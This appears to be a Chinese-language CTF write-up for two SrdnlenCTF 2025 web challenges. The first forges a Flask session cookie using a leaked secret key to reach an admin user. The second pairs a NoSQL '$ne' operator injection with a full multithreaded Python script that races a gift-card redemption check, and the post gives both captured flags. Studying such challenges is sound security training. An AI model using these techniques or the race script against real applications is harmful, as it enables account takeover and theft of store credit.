---
title: SrdnlenCTF 2025
subtitle:
date: 2025-01-23T22:34:19+08:00
slug: 4f8b201
draft: false
author: 
  name: M1ng2u
  link:
  email:
  avatar:
description:
keywords:
license:
comment: false
weight: 0
tags:
  - CTF
categories:
  - CTF
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

# srdnlen

## web

### Ben 10

题目描述说 Ben 10 有好东西，但是注册账号后发现不让访问

附件中的 app.py 给出了 app.secret_key = 'your_secret_key'

把 jwt 用 flask-session-cookie-manager 解密，发现只有 username

![m63nh67z.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678cfd4f54791.png)

从 app.py 中可以看到注册用户时也一起注册了一个对应的 admin 用户

```py
@app.route('/register', methods=['GET', 'POST'])
def register():
    admin_username = f"admin^{username}^{secrets.token_hex(5)}"
    cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",
                           (admin_username, admin_password, None))
    conn.commit()
```

而 admin_username 在 /home 中显示

![m63nkpbe.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678cfdf3f35a2.png)

所以进行 session 伪造

![m63nntuw.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678cfe85f3d47.png)

GET /image/ben10 ，拿到 flag

![m63nsvou.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678cff71b7ebf.png)

> srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}

### Focus. Speed. I am speed.

群里师傅说打 nosql + 竞争，那我就照着打了qwq

![m63oa7cc.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678d0299e048f.png)

应该要买第4个，50 points

![m63ocvz8.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678d0317070ee.png)

网页都访问一遍，发现在 GET /redeem?discountCode=xxx 有查询

翻一下代码，顺着找到：

routes.js

```javascript
const discount = await DiscountCodes.findOne({discountCode})
```

discountCodes.js

```javascript
const DiscountCodeSchema = new mongoose.Schema({
    discountCode: {
        type: String,
        default: null, // Optional field for discount codes
    },
    value: {
        type: Number,
        default: 10
    }
})

module.exports = mongoose.model('DiscountCodes', DiscountCodeSchema)
```

注一下试试看，确实可以

![m63pxcd8.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/19/678d0d6126433.png)

但是礼品卡说是一天只能兑换一次，找代码

routes.js

```javascript
// Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();
```

在保存之前，setTimeout(delay * 1000 ms)，所以我们通过并发请求访问 balance 来制造竞争条件

一直 buy 第一辆🚗，然后重复兑换礼品卡

```py
import time
import requests
import threading
import json

url = "http://speed.challs.srdnlen.it:8082"

# 账号注册
url_register = f"{url}/register-user"
data_user = {"username": "mingzuxxxxxxxxxxxxxxx", "password": "123"}
try:
    response = requests.post(url_register, json=data_user)
    jwt = response.headers["Set-Cookie"].split(";")[0].split("=")[1]
    print(jwt)
except Exception as e:
    print(e)

# 竞争
url_store = f"{url}/store"
headers = {'Cookie': f'jwt={jwt}',}
data_buy = {"productId": 1}

def send_request():
    try:
        response = requests.post(url_store, headers=headers, json=data_buy)
        # print(f"Status Code: {response.status_code}, Response Text: {response.text}")
    except Exception as e:
        print(f"Request failed: {e}")

def send_requests():
    while True:
        send_request()

def race(thread_num):
    threads = []
    for _ in range(thread_num):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# 偷点数
url_redeem = f"{url}/redeem?discountCode[$ne]=1"

def steal_points():
    while True:
        try:
            response = requests.get(url_redeem, headers=headers)
            # print(f"Status Code: {response.status_code}, Response Text: {response.text}")
            if json.loads(response.text)["success"]:
                print(f"Steal Points Successfully: {json.loads(response.text)["message"]}")
        except Exception as e:
            print(f"Request failed: {e}")

def steal_points_rapidly(thread_num):
    threads = []
    for _ in range(thread_num):
        thread = threading.Thread(target=steal_points)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# steal_points()

# 执行
def execute():
    thread_race = threading.Thread(target=race, args=(100,))
    thread_steal = threading.Thread(target=steal_points_rapidly, args=(100,))

    thread_race.start()
    time.sleep(1)
    thread_steal.start()

execute()
```

![m63t610z.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/20/678d22a51cff7.png)

拿到 60 points ，买到辣

![m63t79zl.png](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/20/678d22df872ca.png)

> srdnlen{6peed_1s_My_0nly_Competition}
